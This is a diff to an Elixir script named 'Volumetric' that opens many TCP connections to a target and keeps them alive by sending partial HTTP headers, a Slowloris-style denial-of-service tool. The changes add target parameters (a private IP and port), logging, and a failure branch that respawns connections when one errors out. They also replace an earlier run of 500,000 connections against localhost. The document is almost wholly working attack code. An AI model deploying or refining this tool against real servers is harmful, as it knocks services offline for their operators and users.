@@ -1,7 +1,13 @@
+#parameters
+ip = "192.168.3.2"
+port = 8080
+connections = 2
+
 defmodule Volumetric do
   def start(target, port, connection_count) do
     1..connection_count
     |> Enum.each(fn _ ->
+      IO.puts("connection spawned...")
       spawn(fn -> hold_connection(target, port) end)
     end)
   end
@@ -13,8 +19,12 @@ defmodule Volumetric do
         :gen_tcp.send(socket, "Host: #{target}\r\n")
 
         hold_connection(target, port)
-      {:error, _} ->
-        :error
+      {:error, reason} ->
+        # :error
+        IO.puts("Reason: #{reason}")
+        IO.puts("Spawning new threads...")
+        Volumetric.start(target, port, 1)
+
     end
 
 
@@ -28,7 +38,7 @@ defmodule Volumetric do
   #   end
   # end
 end
-
-Volumetric.start("127.0.0.1", 8080, 500000)
+Volumetric.start(ip, port, connections)
+# Volumetric.start("127.0.0.1", 8080, 2)
 
 :timer.sleep(:infinity)
